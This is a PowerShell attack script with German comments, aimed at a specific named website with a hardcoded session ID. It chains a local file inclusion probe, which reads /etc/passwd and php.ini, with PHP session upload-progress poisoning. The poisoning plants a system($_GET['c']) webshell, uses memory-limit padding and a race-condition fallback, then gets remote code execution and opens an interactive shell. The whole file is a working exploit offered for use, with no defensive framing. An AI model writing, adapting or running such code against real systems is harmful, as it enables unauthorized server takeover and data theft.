#Requires -Version 5.1
<#
  ufcw_chain2.ps1  -  Kette wie zuvor, aber Transport ueber curl.exe
  Vorteil: kein TLS/Proxy/Redirect-Gefrickel, Padding per Datei (keine 32k-Grenze),
  echte curl-Fehlercodes im Log.
#>
[CmdletBinding()]
param(
    [string] $Base    = 'https://ufcw464a.org/',
    [string] $SessId  = 'p2s8db650e9333e4c99',
    [string] $Cmd     = 'id',
    [int]    $Timeout = 25,
    [switch] $NoShell,
    [switch] $NoRace,
    [switch] $Verbose
)

$ErrorActionPreference = 'Continue'
$Log = Join-Path (Get-Location) ("ufcw_chain_{0}.log" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
$Tmp = Join-Path $env:TEMP ("ufcw_" + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $Tmp -Force | Out-Null
$BodyFile = Join-Path $Tmp 'body.bin'
$PlFile   = Join-Path $Tmp 'payload.txt'
$PadFile  = Join-Path $Tmp 'pad.bin'
$Dummy    = Join-Path $Tmp 'a.txt'
[IO.File]::WriteAllText($Dummy, 'X')

function Log([string]$m, [string]$c = 'Gray') {
    $l = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $l -ForegroundColor $c
    Add-Content -LiteralPath $Log -Value $l -Encoding UTF8
}
function Head([string]$m) { Log ''; Log ('=' * 70) 'DarkCyan'; Log $m 'Cyan'; Log ('=' * 70) 'DarkCyan' }

$script:CurlArgs = @('--silent','--show-error','--insecure','--http1.1','--max-time',$Timeout,'--output',$BodyFile,'--write-out','%{http_code} %{time_total}')
function C([string]$Url, [hashtable]$Extra) {
    $a = @() + $script:CurlArgs
    if ($Extra) { foreach ($k in $Extra.Keys) { $a += $Extra[$k] } }
    $a += $Url
    $sw = [Diagnostics.Stopwatch]::StartNew()
    $w  = & curl.exe @a 2>&1
    $sw.Stop()
    $code = 0; $txt = ''
    $w = @($w)
    if ($w.Count -ge 1) { $code = ($w[-1] -split '\s+')[0] -as [int] }
    if ($code -eq 0) { $code = 0 }
    $body = ''
    if (Test-Path $BodyFile) { try { $body = [IO.File]::ReadAllText($BodyFile, [Text.Encoding]::UTF8) } catch {} ; Remove-Item $BodyFile -Force -EA SilentlyContinue }
    [pscustomobject]@{ Code = $code; Body = $body; Ms = $sw.ElapsedMilliseconds; Raw = ($w -join "`n") }
}
function Get-Lfi([string]$path) {
    $r = C "$Base`?$Param=php://filter/convert.base64-encode/resource=$path"
    if ($r.Code -ne 200 -or -not $r.Body) { return $null }
    $best = ''
    foreach ($m in [regex]::Matches($r.Body, '[A-Za-z0-9+/=\s]{24,}')) { $v = $m.Value -replace '\s',''; if ($v.Length -gt $best.Length) { $best = $v } }
    if (-not $best) { return $null }
    try { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($best)) } catch { $null }
}
function Get-Inc([string]$path, [string]$extra = '') { C "$Base`?$Param=$path$extra" }

# ---------------------------------------------------------------- 0 Baseline + Diagnose
Head '0 - Baseline'
if (-not (Get-Command curl.exe -EA SilentlyContinue)) { Log 'curl.exe fehlt (Windows 10 1803+). Abbruch.' 'Red'; return }
Log ("curl: {0}" -f (curl.exe --version | Select-Object -First 1)) 'DarkGray'

$r0 = C $Base
Log ("GET / -> code={0} | {1} ms | {2} B" -f $r0.Code, $r0.Ms, $r0.Body.Length)
if ($r0.Code -eq 0 -or $r0.Code -ge 400) {
    Log 'Fehlerdiagnose:' 'Yellow'
    Log $r0.Raw 'DarkGray'
    if ($Verbose) {
        $v = & curl.exe --silent --show-error --insecure --http1.1 --max-time 15 --verbose --output NUL $Base 2>&1
        $v | Select-Object -First 40 | ForEach-Object { Log ("  " + $_) 'DarkGray' }
    }
    if ($r0.Code -eq 0) {
        Log 'Verbindung scheitert. Versuche ohne Proxy...' 'Yellow'
        $script:CurlArgs = @('--noproxy','*') + $script:CurlArgs
        $r0 = C $Base
        Log ("Retry ohne Proxy -> code={0} | {1} B" -f $r0.Code, $r0.Body.Length) $(if($r0.Code -eq 200){'Green'}else{'Red'})
        if ($r0.Code -eq 0) {
            Log 'Immer noch kein Durchkommen. Pruefe: DNS, Firewall, TLS-Version, VPN.' 'Red'
            Log 'Test von Hand: curl.exe -v --max-time 15 https://ufcw464a.org/' 'Yellow'
            return
        }
    }
}
if ($r0.Code -ge 400) { Log ("HTTP {0} auf / - trotzdem weiter." -f $r0.Code) 'Yellow' }
$srv = ''
if ($r0.Body -match '(?i)<title>([^<]+)') { Log ("Titel: {0}" -f $Matches[1]) 'DarkGray' }
$hdrRaw = (& curl.exe --silent --insecure --head --max-time $Timeout $Base 2>&1) -join "`n"
if ($hdrRaw -match '(?im)^Server:\s*(.+)$') { $srv = $Matches[1].Trim(); Log ("Server: {0}" -f $srv) 'DarkGray' }
$IsFpm = ($srv -match 'nginx|fpm')
Log ("FPM-Pfad: {0}" -f $IsFpm) $(if($IsFpm){'Yellow'}else{'Green'})

# ---------------------------------------------------------------- 1 Parameter
Head '1 - Include-Parameter'
$Param = $null; $IncExec = $false
foreach ($p in 'file','q','lang','view','inc','path','template','dir','url','src','include','page') {
    $pl = C "$Base`?$p=/etc/passwd"
    $fi = C "$Base`?$p=php://filter/convert.base64-encode/resource=/etc/passwd"
    $hitP = $pl.Body -match 'root:x:0:0'
    $hitF = $false
    if ($fi.Body) { $b = ''; foreach ($m in [regex]::Matches($fi.Body,'[A-Za-z0-9+/=\s]{24,}')) { $v = $m.Value -replace '\s',''; if ($v.Length -gt $b.Length) { $b = $v } }; if ($b) { try { $hitF = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) -match 'root:x:0:0' } catch {} } }
    $tag = if ($hitP) { 'PLAIN' } elseif ($hitF) { 'FILTER' } else { 'nein' }
    Log ("  {0,-10} {1}" -f $p, $tag) $(if($tag -ne 'nein'){'Green'}else{'DarkGray'})
    if ($tag -ne 'nein' -and -not $Param) { $Param = $p; $IncExec = $hitP }
    Start-Sleep -Milliseconds 100
}
if (-not $Param) { Log 'Kein Parameter gefunden. Abbruch.' 'Red'; return }
Log ("Parameter={0} includet={1}" -f $Param, $IncExec) $(if($IncExec){'Green'}else{'Yellow'})

# ---------------------------------------------------------------- 2 Konfiguration
Head '2 - php.ini'
$ini = $null
foreach ($f in '/etc/php/7.3/apache2/php.ini','/etc/php/7.3/cli/php.ini','/etc/php/7.3/fpm/php.ini','/etc/php.ini','/usr/local/etc/php/php.ini') {
    $c = Get-Lfi $f
    if ($c -and $c -match 'memory_limit') { $ini = $c; Log ("ini: {0}" -f $f) 'Green'; break }
    Start-Sleep -Milliseconds 80
}
$SavePath = $null; $MemLimit = 0; $Handler = 'php'
if ($ini) {
    $m = [regex]::Match($ini,'(?m)^\s*session\.save_path\s*=\s*"?([^"\r\n]+)"?'); if ($m.Success) { $SavePath = $m.Groups[1].Value.Trim() }
    $m = [regex]::Match($ini,'(?m)^\s*memory_limit\s*=\s*"?(\d+)([KMG]?)'); if ($m.Success) { $n=[int64]$m.Groups[1].Value; switch ($m.Groups[2].Value.ToUpper()) { 'K'{$n*=1024} 'M'{$n*=1048576} 'G'{$n*=1073741824} }; $MemLimit=$n }
    $m = [regex]::Match($ini,'(?m)^\s*session\.serialize_handler\s*=\s*(\S+)'); if ($m.Success) { $Handler=$m.Groups[1].Value.Trim() }
    $sh = [regex]::Match($ini,'(?m)^\s*session\.save_handler\s*=\s*(\S+)'); if ($sh.Success) { Log ("save_handler={0}" -f $sh.Groups[1].Value) $(if($sh.Groups[1].Value -match 'files'){'Green'}else{'Red'}) }
    foreach ($k in 'session.use_strict_mode','session.upload_progress.enabled','session.upload_progress.cleanup') { $mm=[regex]::Match($ini,"(?m)^\s*$([regex]::Escape($k))\s*=\s*(\S+)"); if ($mm.Success) { Log ("{0}={1}" -f $k,$mm.Groups[1].Value) 'DarkGray' } }
}
if (-not $SavePath) { $SavePath = '/var/lib/php/sessions' }
if ($MemLimit -le 0) { $MemLimit = 262144 }
Log ("save_path={0} limit={1} handler={2}" -f $SavePath,$MemLimit,$Handler) 'Cyan'

# ---------------------------------------------------------------- 3 Session-Datei
Head '3 - Session-Datei'
$dirs = @($SavePath,'/var/lib/php/sessions','/var/lib/php/session','/tmp','/tmp/php_sessions','/var/lib/php5','/var/lib/php/7.3/sessions') | Select-Object -Unique
$SessFile = $null
foreach ($d in $dirs) {
    $c = Get-Lfi "$d/sess_$SessId"
    Log ("  {0,-30} {1}" -f $d, $(if($null -eq $c){'-'}else{"$($c.Length) B"})) $(if($null -ne $c){'Green'}else{'DarkGray'})
    if ($null -ne $c -and -not $SessFile) { $SessFile = "$d/sess_$SessId" }
    Start-Sleep -Milliseconds 100
}
if (-not $SessFile) { $SessFile = "$SavePath/sess_$SessId"; Log 'Keine bestaetigt - Standardpfad.' 'Yellow' } else { Log ("Ziel: {0}" -f $SessFile) 'Green' }

# ---------------------------------------------------------------- 4 strict_mode
Head '4 - strict_mode'
$ckFile = Join-Path $Tmp 'cookie.txt'
Remove-Item $ckFile -Force -EA SilentlyContinue
C $Base @{ '--cookie-jar' = $ckFile; '--head' = '' } | Out-Null
$jar = if (Test-Path $ckFile) { Get-Content $ckFile -Raw } else { '' }
if ($jar -and $jar -match "PHPSESSID\s+(\S+)") {
    $newId = $Matches[1]
    if ($newId -ne $SessId) {
        Log ("strict_mode aktiv - neue ID {0}" -f $newId) 'Yellow'
        $SessId = $newId
        foreach ($d in $dirs) { $c = Get-Lfi "$d/sess_$SessId"; if ($null -ne $c) { $SessFile = "$d/sess_$SessId"; break } }
        Log ("Datei: {0}" -f $SessFile) 'Yellow'
    }
} else { Log 'strict_mode aus' 'Green' }
$CK = @{ '--header' = "Cookie: PHPSESSID=$SessId" }

# ---------------------------------------------------------------- 5 Payload
Head '5 - Payload'
$PL = '<?php echo ''PWN:'';system($_GET[''c'']);?>'
[IO.File]::WriteAllText($PlFile, $PL)
Log ("Payload: {0}" -f $PL) 'DarkGray'
Log ("Handler: {0}" -f $Handler) 'DarkGray'
$pr = C $Base ($CK + @{ '--form' = "PHP_SESSION_UPLOAD_PROGRESS=<$PlFile"; '--form' = "f=@$Dummy;filename=a.txt" })
Start-Sleep -Milliseconds 250
$pf = Get-Inc $SessFile
if ($pf.Body -match 'a:\d+:\{s:') { Log 'bestaetigt php_serialize' 'Yellow' }
elseif ($pf.Body -match 'upload_progress_') { Log 'bestaetigt php' 'Green' }
else { Log 'Handler unklar' 'DarkGray' }

# ---------------------------------------------------------------- 6 OOM
Head '6 - OOM-Fenster'
$sizes = @(($MemLimit-16384),($MemLimit-8192),($MemLimit-4096),$MemLimit,($MemLimit+4096),($MemLimit+8192),($MemLimit+32768),($MemLimit+65536)) | Where-Object { $_ -gt 0 } | Select-Object -Unique
$Poisoned = $false; $UsedPad = 0
foreach ($s in $sizes) {
    [IO.File]::WriteAllText($PadFile, ('A' * $s))
    $r = C $Base ($CK + @{ '--form' = "PHP_SESSION_UPLOAD_PROGRESS=<$PlFile"; '--form' = "pad=<$PadFile"; '--form' = "f=@$Dummy;filename=a.txt" })
    Start-Sleep -Milliseconds 400
    $chk = Get-Inc $SessFile
    $exec = $chk.Body -match 'PWN:'; $kept = $chk.Body -match 'upload_progress_'
    Log ("  pad {0,7} -> code={1} {2,5}ms | {3}" -f $s,$r.Code,$r.Ms,$(if($exec){'EXEC'}elseif($kept){'liegt'}else{'leer'})) $(if($exec){'Green'}elseif($kept){'Yellow'}else{'DarkGray'})
    if ($exec -or $kept) { $Poisoned = $true; $UsedPad = $s; break }
    Start-Sleep -Milliseconds 300
}
if (-not $Poisoned -and -not $NoRace) {
    Log 'Kein Fenster - Race-Fallback' 'Yellow'
    [IO.File]::WriteAllText($PadFile, ('A' * 300000))
    $job = Start-Job -ScriptBlock {
        param($b,$h,$plf,$padf,$dm,$to)
        for ($i=0; $i -lt 3000; $i++) {
            & curl.exe --silent --insecure --http1.1 --max-time $to --output NUL --header $h --form "PHP_SESSION_UPLOAD_PROGRESS=<$plf" --form "pad=<$padf" --form "f=@$dm;filename=a.txt" $b 2>&1 | Out-Null
        }
    } -ArgumentList $Base,"Cookie: PHPSESSID=$SessId",$PlFile,$PadFile,$Dummy,$Timeout
    for ($i=1; $i -le 150; $i++) { $t = Get-Inc $SessFile '&c=id'; if ($t.Body -match 'uid=') { Log 'Treffer im Race' 'Green'; $Poisoned=$true; break }; Start-Sleep -Milliseconds 250 }
    Stop-Job $job -EA SilentlyContinue; Remove-Job $job -Force -EA SilentlyContinue
}
if (-not $Poisoned) { Log 'Poison fehlgeschlagen. Log pruefen.' 'Red'; return }

# ---------------------------------------------------------------- 7 Trigger
Head '7 - Trigger'
$out = $null
for ($i=1; $i -le 60; $i++) {
    $t = Get-Inc $SessFile ('&c=' + [Uri]::EscapeDataString($Cmd))
    if ($t.Body -match 'PWN:([\s\S]{0,4000})') { $out = ($Matches[1] -replace '<[^>]+>','').Trim(); if ($out) { break } }
    Start-Sleep -Milliseconds 200
}
if ($out) { Log 'RCE:' 'Green'; Write-Host $out -ForegroundColor White } else { Log 'Kein Output.' 'Red' }

# ---------------------------------------------------------------- 8 Shell
if ($out -and -not $NoShell) {
    Head '8 - Shell (leer = Ende)'
    while ($true) {
        $c = Read-Host 'ps> '
        if ([string]::IsNullOrWhiteSpace($c)) { break }
        $t = Get-Inc $SessFile ('&c=' + [Uri]::EscapeDataString($c))
        if ($t.Body -match 'PWN:([\s\S]{0,6000})') { Write-Host (($Matches[1] -replace '<[^>]+>','').Trim()) -ForegroundColor White }
        else { Write-Host $t.Body.Substring(0,[Math]::Min(400,$t.Body.Length)) -ForegroundColor DarkGray }
    }
}

Head 'Ende'
Log ("Param={0} ID={1} Datei={2} Pad={3}" -f $Param,$SessId,$SessFile,$UsedPad) 'Cyan'
Log ("Log: {0}" -f $Log) 'DarkGray'